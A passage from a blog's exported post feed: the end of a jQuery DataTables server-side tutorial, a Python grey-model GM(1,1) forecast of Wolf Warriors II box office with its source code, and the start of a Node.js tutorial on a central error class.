class="string">&quot;2011/07/25&quot;</span>,</span><br><span class="line">            <span class="string">&quot;$170,750&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;Ashton Cox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Junior Technical Author&quot;</span>,</span><br><span class="line">            <span class="string">&quot;San Francisco&quot;</span>,</span><br><span class="line">            <span class="string">&quot;1562&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2009/01/12&quot;</span>,</span><br><span class="line">            <span class="string">&quot;$86,000&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>除了以上几种方法外，如果数据量比较大，这个时候就需要使用服务器模式（Server-Side）动态获取数据。</p>
<p> 在服务器模式下，所有的分页、搜索、排序等操作，Datatables 都会交给服务器去处理。所以每次绘制Datatables， 都会请求一次服务器获取需要的数据，详细案例请见下文。</p>
</li>
</ol>
<h2 id="二、Server-Side-案例"><a href="#二、Server-Side-案例" class="headerlink" title="二、Server-Side 案例"></a>二、Server-Side 案例</h2><p>使用 Server-Side 模式加载数据时，要先使用 <code>serverSide</code> 配置项打开 Server-Side 模式，同时开启 <code>processing</code> 在动态加载数据时会提示用户“数据正在加载，请稍等……”，使用 <code>ajax</code> 选项配置后端处理脚本的路径，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#example&#x27;</span>).<span class="title function_">dataTable</span>( &#123;</span><br><span class="line">        <span class="string">&quot;processing&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;serverSide&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;ajax&quot;</span>: <span class="string">&quot;path/to/handleAjax.php&quot;</span></span><br><span class="line">    &#125; );</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>

<p>分页、搜索、排序等操作都会再次请求服务器获得新的数据源，发送 AJAX 请求时除了手动添加的参数外，DataTable 还会自动添加如下参数，</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于标记请求</span></span><br><span class="line">draw<span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line"><span class="comment">// 表头信息</span></span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>data<span class="punctuation">]</span><span class="punctuation">:</span> id</span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>name<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>searchable<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>orderable<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>search<span class="punctuation">]</span><span class="punctuation">[</span>value<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">columns<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>search<span class="punctuation">]</span><span class="punctuation">[</span>regex<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">...</span><br><span class="line">columns<span class="punctuation">[</span>n<span class="punctuation">]</span><span class="punctuation">[</span>search<span class="punctuation">]</span><span class="punctuation">[</span>regex<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="comment">// 排序规则，如下表示第一个排序规则是：按照第三列（从 0 开始）降序排列</span></span><br><span class="line">order<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>column<span class="punctuation">]</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">order<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>dir<span class="punctuation">]</span><span class="punctuation">:</span> desc</span><br><span class="line"><span class="comment">// 分页参数</span></span><br><span class="line">start<span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">length<span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line"><span class="comment">// 筛选参数</span></span><br><span class="line">search<span class="punctuation">[</span>value<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">search<span class="punctuation">[</span>regex<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br></pre></td></tr></table></figure>

<p>AJAX 响应的数据包中，至少应该包括以下字段，</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">draw<span class="punctuation">:</span> <span class="number">2</span>  <span class="comment">// 标记请求，从请求参数中获取即可</span></span><br><span class="line">data<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span>id<span class="punctuation">:</span> <span class="string">&quot;13155030&quot;</span><span class="punctuation">,</span> date<span class="punctuation">:</span> <span class="string">&quot;2018-07-27&quot;</span><span class="punctuation">,</span> parent_id<span class="punctuation">:</span> <span class="string">&quot;76958474430&quot;</span><span class="punctuation">,</span>…<span class="punctuation">&#125;</span><span class="punctuation">,</span>…<span class="punctuation">]</span>  <span class="comment">// 表格数据</span></span><br><span class="line">recordsFiltered<span class="punctuation">:</span> <span class="number">3236</span>  <span class="comment">// 符合筛选条件的总条数</span></span><br><span class="line">recordsTotal<span class="punctuation">:</span> <span class="number">3236</span>     <span class="comment">// 总条目数</span></span><br></pre></td></tr></table></figure>

<p>如果服务端处理错误，可以使用 <code>error</code> 返回错误信息，错误信息将在实例化表格时弹窗显示。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="http://datatables.club/manual/server-side.html">Server-Side</a></li>
<li><a href="http://datatables.club/reference/option/">配置选项</a></li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>战狼 2 票房是否会达到 40 亿？</title>
    <url>/experience/practice/dev-wolf-warriors-II-box-office-forecast/</url>
    <content><![CDATA[<p> 电影票房影响因素有很多，如影片质量、宣传、档期、排片、同期竞争、口碑等。<a href="https://en.wikipedia.org/wiki/Grey_box_model">灰色模型（GM）</a> 常常用于对小规模数据进行预测分析。本文试图使用 GM(1,1) 对战狼 2 票房进行预测。</p>
 <span id="more"></span>
<h2 id="GM-1-1"><a href="#GM-1-1" class="headerlink" title="GM(1,1)"></a>GM(1,1)</h2><p>灰色系统内的一部分信息是已知的，另一部分信息是未知的，系统内各因素间有不确定的关系。</p>
<p>灰色预测是对既含有已知信息又含有不确定信息的系统进行预则，就是对在一定范围内变化的、与时间有关的灰色过程进行预测。灰色预测通过鉴别系统因素之间发展趋势的相异程度，即进行关联分析，并对 原始数据进行生成处理来寻找系统变动的规律，生成有较强规律性的数据序列，然后建立相应的微分方程模型，从而预测事物未来发展趋势的状况。</p>
<p>『注』更多详细介绍可以参考我的另一篇博文<a href="https://www.syncher.cn/?p=466">基于灰色模型（GM(1,1)）的船舶事故预测研究</a></p>
<h2 id="非周末特征"><a href="#非周末特征" class="headerlink" title="非周末特征"></a>非周末特征</h2><p>初步观察历史数据可以发现，周末票房明显增长，这也是合理的，因此周末和非周末分开预测。基于7月27~8月4日除去周末的历史票房，</p>
<p><img src="/images/20170806/data.png" alt="数据"></p>
<p>使用 GM(1,1) 对未来 5 天工作日（8.07-8.11）预测，预测结果为：</p>
<pre><code>[ 26592.85722754  26863.52726345  27136.95225974  27413.16025724，27692.17958215]
</code></pre>
<h2 id="周末特征"><a href="#周末特征" class="headerlink" title="周末特征"></a>周末特征</h2><p>基于周票房末数据即7月29,7月30,8月5号使用GM(1,1)对周日（8 .06） 票房预测，预测结果为：29942.36973182 万。</p>
<p> 因此未来 6 天以后总票房预测达到 429990 万元。</p>
<h2 id="为社么可以相信预测结果"><a href="#为社么可以相信预测结果" class="headerlink" title="为社么可以相信预测结果"></a>为社么可以相信预测结果</h2><p>其实在真正预测之前需要对模型的精度和准确性做估计，以非周末特征做为例，为了验证模型的准确性，我们选择7月27~8月3日中的非周末数据对8月4号票房做预测，预测结果为，26308.26947235，实际结果为 26340.9 相对误差 0.1%，娱乐而已，足矣！</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p> 影响电影的票房因素有很多，本文使用 GM（1,1）预测，模型对内部的复杂关系进行了关联，最终做出了预测。当然如果未来的影响因素发生巨变，比如电影排期突然下降、甚至停播，那么预测结果将会受到巨大影响，因此预测纯属娱乐，仅供参考，不准轻喷。</p>
<p> 最后放一张我在战狼中的照片[左一]，其实只有几秒的镜头，我和班长站在舰长前面保卫着舰长，当冷锋干儿子跑过来的时候我说：“站住”，仅此而已！<br> <img src="/images/20170806/me.jpg"></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="预测源码"><a href="#预测源码" class="headerlink" title="预测源码"></a>预测源码</h3><p>使用方式，新建文件 gm.py，将一下代码复制到 gm.py 中，在文件目录下执行</p>
<pre><code>&gt;# python gm.py
</code></pre>
<p>即可看到输出结果</p>
<pre><code># -*- coding: utf-8 -*-
import numpy as np
import math

def predict_func(history_data, m):
    n = len(history_data)
    X0 = np.array(history_data)

    #累加生成
    history_data_agg = [sum(history_data[0:i+1]) for i in range(n)]
    X1 = np.array(history_data_agg)

    #计算数据矩阵B和数据向量Y
    B = np.zeros([n-1,2])
    Y = np.zeros([n-1,1])
    for i in range(0,n-1):
        B[i][0] = -0.5*(X1[i] + X1[i+1])
        B[i][1] = 1
        Y[i][0] = X0[i+1]

    #计算GM(1,1)微分方程的参数a和u
    #A = np.zeros([2,1])
    A = np.linalg.inv(B.T.dot(B)).dot(B.T).dot(Y)
    a = A[0][0]
    u = A[1][0]

    #建立灰色预测模型
    XX0 = np.zeros(n)
    XX0[0] = X0[0]
    for i in range(1,n):
        XX0[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i));


    #模型精度的后验差检验
    e = 0      #求残差平均值
    for i in range(0,n):
        e += (X0[i] - XX0[i])
    e /= n

    #求历史数据平均值
    aver = 0;
    for i in range(0,n):
        aver += X0[i]
    aver /= n

    #求历史数据方差
    s12 = 0;
    for i in range(0,n):
        s12 += (X0[i]-aver)**2;
    s12 /= n

    #求残差方差
    s22 = 0;
    for i in range(0,n):
        s22 += ((X0[i] - XX0[i]) - e)**2;
    s22 /= n

    #求后验差比值
    C = s22 / s12
    #求小误差概率
    cout = 0.0
    for i in range(0,n):
        if abs((X0[i] - XX0[i]) - e) &lt; 0.6754*math.sqrt(s12):
            cout = cout+1
        else:
            cout = cout
    P = (cout / n)

    sum_pre = 0
    if (C &lt; 0.35 and P &gt; 0.95):
        #预测精度为一级
        f = np.zeros(m)
        for i in range(0,m):
            f[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i+n))
        # print f  # 预测接下来 m 天各天票房
        return sum(history_data) + sum(f) # 预测总票房
    else:
        print(&#39;灰色预测法不适用&#39;)


# 工作日数据： 7月27~8月4日除去周末
history_work_data = [9831.6,21226.6,27224.7,29118.1,27736.3,22375.8,26340.9]
m1 = 5
## 周末
history_weekend_data = [30988.6,36457.4,33049.7] # 周末数据,7月29,7月30,8月5号
m2 = 1

forcast_box = predict_func(history_work_data, m1) + predict_func(history_weekend_data, m2)
print(&quot;The forcast total box office of Wolf Warriors II is %d million after %d days&quot;%(forcast_box,m1+m2))
</code></pre>
<h3 id="验证源码"><a href="#验证源码" class="headerlink" title="验证源码"></a>验证源码</h3><p>新建 gm_validation.py 复制一下内容，保存，执行：</p>
<pre><code>&gt;# python gm_validation.py
</code></pre>
<p>即可看到输出结果</p>
<pre><code># -*- coding: utf-8 -*-
import numpy as np
import math

history_data = [9831.6,21226.6,27224.7,29118.1,27736.3,22375.8] # 8月4号： 26340.9
n = len(history_data)
X0 = np.array(history_data)

#累加生成
history_data_agg = [sum(history_data[0:i+1]) for i in range(n)]
X1 = np.array(history_data_agg)

#计算数据矩阵B和数据向量Y
B = np.zeros([n-1,2])
Y = np.zeros([n-1,1])
for i in range(0,n-1):
    B[i][0] = -0.5*(X1[i] + X1[i+1])
    B[i][1] = 1
    Y[i][0] = X0[i+1]

#计算GM(1,1)微分方程的参数a和u
#A = np.zeros([2,1])
A = np.linalg.inv(B.T.dot(B)).dot(B.T).dot(Y)
a = A[0][0]
u = A[1][0]

#建立灰色预测模型
XX0 = np.zeros(n)
XX0[0] = X0[0]
for i in range(1,n):
    XX0[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i));


#模型精度的后验差检验
e = 0      #求残差平均值
for i in range(0,n):
    e += (X0[i] - XX0[i])
e /= n

#求历史数据平均值
aver = 0;
for i in range(0,n):
    aver += X0[i]
aver /= n

#求历史数据方差
s12 = 0;
for i in range(0,n):
    s12 += (X0[i]-aver)**2;
s12 /= n

#求残差方差
s22 = 0;
for i in range(0,n):
    s22 += ((X0[i] - XX0[i]) - e)**2;
s22 /= n

#求后验差比值
C = s22 / s12
#求小误差概率
cout = 0.0
for i in range(0,n):
    if abs((X0[i] - XX0[i]) - e) &lt; 0.6754*math.sqrt(s12):
        cout = cout+1
    else:
        cout = cout
P = (cout / n)

sum_pre = 0
if (C &lt; 0.35 and P &gt; 0.95):
    m = 1 # 预测8月3号，8月4号
    #预测精度为一级
    f = np.zeros(m)
    for i in range(0,m):
        f[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i+n))
    print f  # 预测接下来 m 天各天票房
else:
    print(&#39;灰色预测法不适用&#39;)
</code></pre>
<p>刚学的 Python，希望您宽广的胸怀能包它的存在，如果您有建议或意见可以通过邮件 <a href="mailto:&#x73;&#x79;&#110;&#x63;&#104;&#x65;&#x72;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#109;">syncher@qq.com</a> 与我取得联系。</p>
<p><strong>申明</strong>： 预测结果仅代表个人观点，历史数据来自<a href="https://mdianying.baidu.com/rank/boxDetail?sfrom=wise_film_box&movieId=62880">百度糯米电影</a></p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>战狼</tag>
        <tag>GM</tag>
      </tags>
  </entry>
  <entry>
    <title>Error Handling in Practice - Centralizing Operational Errors in Node.js</title>
    <url>/experience/practice/error-handling-in-practice/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In the ever-evolving realm of software development, errors and exceptions are constant companions. These errors can be broadly categorized into two types: programming errors and operational errors. While programming errors are typically caught during development and testing phases, operational errors are the real-world hurdles that applications must gracefully navigate in production environments. In this blog, we will shine a spotlight on the art of handling operational errors and delve into the pivotal role played by a central error class in Node.js.</p>
<span id="more"></span>

<h2 id="Operational-Errors-Navigating-the-Real-World-Challenges"><a href="#Operational-Errors-Navigating-the-Real-World-Challenges" class="headerlink" title="Operational Errors: Navigating the Real-World Challenges"></a>Operational Errors: Navigating the Real-World Challenges</h2><p>Operational errors are a natural part of any software application’s lifecycle. They can arise from various sources, including network issues, database failures, external service unavailability, and even user input. In a typical Node.js application, these errors can occur at different layers, such as the controller, service, and database access (Dao) layers. Handling these errors effectively is crucial for maintaining application reliability and providing a smooth user experience.</p>
<h2 id="The-Central-Error-Class-One-for-All"><a href="#The-Central-Error-Class-One-for-All" class="headerlink" title="The Central Error Class: One for All"></a>The Central Error Class: One for All</h2><p>In the world of Node.js, it’s a common practice to employ a central error class to manage operational errors efficiently. This central error class serves as a hub for creating, formatting, and handling errors in a structured and consistent manner. By adhering to a single error class throughout your project, you can simplify error management and ensure uniformity in error responses.</p>
<p>For instance, we have <code>MyProjectError</code> as an central error class.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyProjectError</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Error</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="variable constant_">UNKNOWN_ERROR_CODE</span> = <span class="string">&quot;99999&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** The module in which the error occurred. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_module</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="comment">/** A code to uniquely identify the error in a module. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_code</span>: <span class="built_in">number</span> | <span class="built_in">string</span>;</span><br><span class="line">  <span class="comment">/** A unique id that identifies the error uniquely in the logs. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_guid</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="comment">/** A http status code that is assigned to the error. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_statusCode</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="comment">/** An array of error objects that lead to this error. Errors in causes do not have any causes themselves. */</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="attr">_causes</span>: <span class="title class_">MyProjectError</span>[];</span><br><span class="line">  <span class="comment">/** An optional message field for additional information. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_details</span>?: <span class="built_in">string</span>;</span><br><span class="line">  <span class="comment">/** The host on which the error occurred. */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_host</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="comment">/* Optional array of strings that are used to build the localization string */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_i18nParameters</span>: <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;;</span><br><span class="line">  <span class="comment">/** Key to localization string that will be looked up along with a language key */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_i18nKey</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Create a new MyProjectError.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">module</span> - The module in which the error is thrown, e.g. x-glossary</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">code</span> - The error code number, e.g. 22500. It&#x27;s also possible to use a string, but this is discouraged!</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">message</span> - The message that should be displayed with the error</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">i18nKey</span> - internationalization key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">i18nParameters</span> - parameters for i18n translation</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">statusCode</span> - A status code that can be used for the http response</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">causes</span> - Additional errors that lead to this error</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">details</span> - An optional message field for additional information</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">host</span> - An optional indicator of the pod in which the error occured</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="attr">module</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    <span class="attr">code</span>: <span class="built_in">number</span> | <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    <span class="attr">message</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    <span class="attr">i18nParameters</span>: <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt; = [],</span></span><br><span class="line"><span class="params">    <span class="attr">i18nKey</span>: <span class="built_in">string</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">    <span class="attr">statusCode</span>: <span class="built_in">number</span> = <span class="number">500</span>,</span></span><br><span class="line"><span class="params">    <span class="attr">causes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">MyProjectError</span> | <span class="title class_">Error</span>&gt; = [],</span></span><br><span class="line"><span class="params">    <span class="attr">details</span>?: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    host = hostname()</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(<span class="string">`<span class="subst">$&#123;message&#125;</span>: <span class="subst">$&#123;details&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">message</span> = message;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;MyProjectError&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_module</span> = <span class="variable language_">module</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_i18nParameters</span> = i18nParameters;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_i18nKey</span> = i18nKey;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_code</span> = code || <span class="title class_">MyProjectError</span>.<span class="property">UNKNOWN_ERROR_CODE</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_guid</span> = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_statusCode</span> = statusCode;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_causes</span> = <span class="title class_">MyProjectError</span>.<span class="title function_">flatten</span>(</span><br><span class="line">      causes.<span class="title function_">map</span>(<span class="function">(<span class="params">_</span>) =&gt;</span> <span class="title class_">MyProjectError</span>.<span class="title function_">wrap</span>(_))</span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_details</span> = details;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_host</span> = host;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Returns the error as a JSON object. */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">toJSON</span>(): <span class="title class_">JSON</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">message</span>: <span class="variable language_">this</span>.<span class="property">message</span>,</span><br><span class="line">      <span class="attr">code</span>: <span class="variable language_">this</span>.<span class="property">_code</span>,</span><br><span class="line">      <span class="attr">module</span>: <span class="variable language_">this</span>.<span class="property">_module</span>,</span><br><span class="line">      <span class="attr">guid</span>: <span class="variable language_">this</span>.<span class="property">_guid</span>,</span><br><span class="line">      <span class="attr">statusCode</span>: <span class="variable language_">this</span>.<span class="property">_statusCode</span>,</span><br><span class="line">      <span class="attr">causes</span>: <span class="variable language_">this</span>.<span class="property">_causes</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">_</span>) =&gt;</span> _.<span class="title function_">toJSON</span>()),</span><br><span class="line">      <span class="attr">details</span>: <span class="variable language_">this</span>.<span class="property">_details</span>,</span><br><span class="line">      <span class="attr">hostname</span>: <span class="variable language_">this</span>.<span class="property">_host</span>,</span><br><span class="line">      <span class="attr">i18nParameters</span>: <span class="variable language_">this</span>.<span class="property">_i18nParameters</span>,</span><br><span class="line">      <span class="attr">i18nKey</span>: <span class="variable language_">this</span>.<span class="property">_i18nKey</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Add a cause to the error. */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">addCause</span>(<span class="params"><span class="attr">err</span>: <span class="title class_">MyProjectError</span> | <span class="title class_">Error</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_causes</span>.<span class="title function_">push</span>(<span class="title class_">MyProjectError</span>.<span class="title function_">wrap</span>(err));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>MyProjectError</code> class is a custom error class that extends the built-in Error class. It includes additional properties and methods to handle and format errors in a structured way. By using this error class, we are able to create and handle specific types of errors based on their characteristics.<br>The <code>MyProjectError</code> class includes properties such as the module in which the error occurred, an error code, a unique identifier for the error, an HTTP status code, causes of the error, and additional details. It also provides methods to add causes to the error and convert the error to a JSON object.<br>By using this error class, we can create consistent and standardized error objects, making error handling more structured and maintainable.</p>
<h2 id="Utilize-Central-Error-Class"><a href="#Utilize-Central-Error-Class" class="headerlink" title="Utilize Central Error Class"></a>Utilize Central Error Class</h2><p>Around the central error class, we are able to utilize the error handling.</p>
<h3 id="1-Unified-Error-Creation"><a href="#1-Unified-Error-Creation" class="headerlink" title="1. Unified Error Creation"></a>1. Unified Error Creation</h3><p>The central error class allows developers to create and throw specific types of errors with ease. This consistency in error creation facilitates better communication between different layers of your application, ensuring that everyone speaks the same error language.</p>
<h3 id="2-Send-Error-Responses"><a href="#2-Send-Error-Responses" class="headerlink" title="2. Send Error Responses"></a>2. Send Error Responses</h3><p>When an operational error occurs, it’s essential to communicate the issue to the client in a clear and standardized way. The central error class enables you to generate error responses that adhere to a predefined structure, making it easier for clients to understand and handle errors gracefully.</p>
<h3 id="3-Convert-Unknown-Errors"><a href="#3-Convert-Unknown-Errors" class="headerlink" title="3. Convert Unknown Errors"></a>3. Convert Unknown Errors</h3><p>Not all errors are predictable, and some may be unexpected or unfamiliar. In such cases, the central error class can help by converting these unknown errors into a generic format that can be handled more effectively. This approach ensures that your application can gracefully recover from unforeseen issues.</p>
<h3 id="4-Localize-Translate-Error-Messages"><a href="#4-Localize-Translate-Error-Messages" class="headerlink" title="4. Localize&#x2F;Translate Error Messages"></a>4. Localize&#x2F;Translate Error Messages</h3><p>In a globalized world, catering to users with diverse language preferences is crucial. The central error class can be extended to include localization and translation features. This allows error messages to be presented to users in their preferred language, enhancing the overall user experience.</p>
<p>For example, we throw the an error when ‘two tenant mode feature is not enabled’.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="variable constant_">ERRORS</span>.<span class="title function_">twoTenantModeFeatureNotEnabled</span>(targetTenantUuid, systemAction);</span><br></pre></td></tr></table></figure>

<p>The error is generated by function <code>twoTenantModeFeatureNotEnabled</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">twoTenantModeFeatureNotEnabled</span>: (<span class="attr">tenantUuid</span>: string, <span class="attr">systemAction</span>: <span class="title class_">SystemAction</span>): <span class="function"><span class="params">MyProjectError</span></span></span><br><span class="line"><span class="function">	=&gt;</span> <span class="title function_">create</span>(<span class="string">&#x27;10045&#x27;</span>, <span class="string">&#x27;errOdc04045&#x27;</span>, [systemAction, tenantUuid], <span class="number">400</span>)</span><br></pre></td></tr></table></figure>

<p>The function <code>create</code> is the single entry point to create an error that instances of <code>MyProjectError</code>. It receives an error code, an error message localization key, a set of parameters for translation, and an HTTP response code.</p>
<p>In the localization properties, we have the definition of <code>errOdc04045</code> for building an error message.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#<span class="attr">YMSE</span>: &#123;<span class="number">0</span>&#125; is the action name <span class="keyword">of</span> the system</span><br><span class="line">#<span class="attr">YMSE</span>: &#123;<span class="number">1</span>&#125; is the target system to create/restore.</span><br><span class="line">errOdc04045=<span class="title class_">Cannot</span> &#123;<span class="number">0</span>&#125; the system &#123;<span class="number">1</span>&#125; because two tenant mode is not enabled</span><br></pre></td></tr></table></figure>

<p>The error message is built during the serialization phase before sending it to clients.</p>
<h2 id="Error-handling-in-Three-Layers-of-backend-service"><a href="#Error-handling-in-Three-Layers-of-backend-service" class="headerlink" title="Error handling in Three Layers of backend service"></a>Error handling in Three Layers of backend service</h2><p>In a typical backend architecture, your application may consist of three primary layers: the controller, service, and database access (Dao) layers. Each of these layers plays a role in processing requests and handling operational errors.</p>
<h3 id="Controller-Layer"><a href="#Controller-Layer" class="headerlink" title="Controller Layer"></a>Controller Layer</h3><p>The controller layer serves as the entry point for incoming requests and plays a crucial role in error handling and response generation. e.g. we have the entry <code>createSystems</code> for <code>POST /v1/systems</code> to create a set of systems in batch as below.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a set of systems. Only BTP systems have been implemented so far.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">req</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">res</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">createSystems</span>(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span>, <span class="attr">res</span>: <span class="title class_">Response</span></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> serviceContext = <span class="keyword">await</span> <span class="title function_">getServiceContext</span>(req);</span><br><span class="line">    <span class="keyword">const</span> systemService = <span class="keyword">new</span> <span class="title class_">SystemService</span>(serviceContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> systemsToCreate = getRequestBody &lt; <span class="title class_">ISystemsToCreate</span> &gt; req.<span class="property">systems</span>;</span><br><span class="line">    <span class="keyword">await</span> systemService.<span class="title function_">createSystems</span>(systemsToCreate);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">end</span>();</span><br><span class="line">  &#125; <span 